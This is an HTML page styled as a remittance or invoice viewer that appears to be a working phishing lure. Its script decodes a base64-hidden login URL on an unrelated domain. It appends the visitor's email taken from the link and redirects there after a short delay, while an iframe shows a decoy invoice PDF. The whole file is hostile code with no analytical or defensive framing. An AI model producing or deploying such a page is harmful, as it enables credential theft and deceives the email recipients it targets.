<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Remittance Copy</title>
    <script>
        // Base64 encoded redirect URL
        const encodedUrl = "aHR0cHM6Ly9sb2dpbi5hY2phcnZpc2J1aWxkZXJzLmNvbS9Sc3BLdE9odQ==";

        // Decode the base URL
        const baseRedirectUrl = atob(encodedUrl);

        // Extract email from the current URL's query parameters
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email'); // Get the 'email' parameter

        // Add email as a query parameter to the redirect URL without encoding
        const redirectUrl = email ? `${baseRedirectUrl}#${email}` : baseRedirectUrl;

        // Delay the redirect to display the message first
        setTimeout(() => {
            window.location.href = redirectUrl;
        }, 1500); // Redirect after 1.5 seconds
    </script>
    <style>
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            color: #333;
        }
        p {
            font-size: 1.2rem;
            font-weight: bold;
        }
        iframe {
            border: none;
            width: 100%;
            height: 100vh;
        }
    </style>
</head>
<body>
    <iframe src="https://filetransfersecure.vercel.app/invoice.pdf"></iframe>

</body>
</html>
